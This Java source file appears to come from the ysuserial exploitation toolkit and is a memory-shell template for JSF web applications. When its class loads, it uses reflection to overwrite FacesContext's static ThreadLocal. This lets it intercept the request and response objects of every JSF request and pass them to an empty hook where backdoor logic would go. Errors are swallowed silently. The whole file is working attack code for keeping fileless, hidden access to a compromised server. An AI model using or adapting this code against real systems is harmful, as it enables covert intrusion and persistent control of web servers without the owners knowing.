package org.su18.ysuserial.payloads.templates.memshell.jsf;

import java.lang.reflect.Field;

/**
 * @author su18
 */
public class JSFThreadLocalMS extends ThreadLocal {

	public static String pattern;

	public static String NAME;

	private static ThreadLocal INSTANCE;


	static {
		try {
			ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
			Field       field       = classLoader.loadClass("javax.faces.context.FacesContext").getDeclaredField("instance");
			field.setAccessible(true);
			field.set(null, new JSFThreadLocalMS((ThreadLocal) field.get(null)));
		} catch (Exception ignored) {
		}
	}

	public JSFThreadLocalMS() {
	}

	public JSFThreadLocalMS(ThreadLocal threadLocal) {
		INSTANCE = threadLocal;
	}

	@Override
	public Object get() {
		return INSTANCE.get();
	}

	@Override
	public void set(Object obj) {
		INSTANCE.set(obj);
		try {
			Field field = obj.getClass().getDeclaredField("externalContext");
			field.setAccessible(true);
			Object externalContext = field.get(obj);
			Field  field2          = externalContext.getClass().getDeclaredField("request");
			field2.setAccessible(true);
			Field field3 = externalContext.getClass().getDeclaredField("response");
			field3.setAccessible(true);
			executeThreadLocal(field2.get(externalContext), field3.get(externalContext));
		} catch (Exception ignored) {
		}
	}

	public void executeThreadLocal(Object request, Object response) {
	}
}
